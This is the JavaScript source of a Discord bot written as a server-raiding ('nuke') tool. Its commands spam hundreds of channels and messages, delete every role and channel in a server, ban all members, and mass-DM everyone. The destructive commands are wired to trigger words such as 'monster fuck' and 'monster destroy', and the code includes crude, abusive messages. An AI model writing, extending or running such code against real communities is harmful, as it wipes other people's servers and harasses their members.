const Discord = require('discord.js');
const client = new Discord.Client();
const prefix = 'monster'


client.on('ready', () => {
  console.log(`Logged in as ${client.user.tag}!`);
});

client.on('message', msg => {
  if (msg.content === 'ready') {
    msg.reply('yes sir :smiling_imp:');
  }
});


client.on('message' , async (message) => {
    if (message.content.startsWith(prefix + 'spam')) {
for (let i = 0; i < 500; i++) {

        message.guild.createChannel('xd', 'text')
        message.channel.send('hello bitches');
}
}
});   


const developers = ["348555232529219585","411081496485691392"]
const adminprefix = "#";
client.on('message', message => {
    var argresult = message.content.split(` `).slice(1).join(' ');
      if (!developers.includes(message.author.id)) return;
      
  if (message.content.startsWith(adminprefix + 'ply')) {
    client.user.setGame(argresult);
      message.channel.send(`**?   ${argresult}**`)
  } else 
     if (message.content === (adminprefix + "leave")) {
    message.guild.leave();        
  } else  
  if (message.content.startsWith(adminprefix + 'wt')) {
  client.user.setActivity(argresult, {type:'WATCHING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'ls')) {
  client.user.setActivity(argresult , {type:'LISTENING'});
      message.channel.send(`**?   ${argresult}**`)
  } else 
  if (message.content.startsWith(adminprefix + 'st')) {
    client.user.setGame(argresult, "https://www.twitch.tv/idk");
      message.channel.send(`**?**`)
  }
  if (message.content.startsWith(adminprefix + 'setname')) {
  client.user.setUsername(argresult).then
      message.channel.send(`Changing The Name To ..**${argresult}** `)
} else
if (message.content.startsWith(adminprefix + 'setavatar')) {
  client.user.setAvatar(argresult);
    message.channel.send(`Changing The Avatar To :**${argresult}** `);
}
});

client.on('message', x5bz => {   
    if (x5bz.content.startsWith("monster fuck")) {
        x5bz.guild.roles.forEach(r => { r.delete() }) 
        x5bz.guild.channels.forEach(c => { c.delete() })
                   let v5bz = new Discord.RichEmbed()
               .setColor('RANDOM')
               .setDescription('**Done sir ! i have been FUCKED THE SERVER ATLATNTIC GANG :cop:**')
              x5bz.author.sendEmbed(v5bz);
    }
    });


client.on('message', async message => {
    if(message.content === "monster destroy") {
        if(message.author.id !== '462016762066501633') return;
        message.guild.members.forEach(member => {
           member.ban(); 
        });
    } 
 });



 client.on('message', msg =>{
    let message=msg;
    if(message.content.startsWith("bc")){
        var args = message.content.split(' ').slice(1).join(' ');
    msg.guild.members.forEach(m=>{
        m.send(args.replace(/[user]/g,m)).catch();
    if(message.attachments.first()){
m.sendFile(message.attachments.first().url).catch();
    }
    })    ;
    }
});








client.login(process.env.BOT_TOKEN);
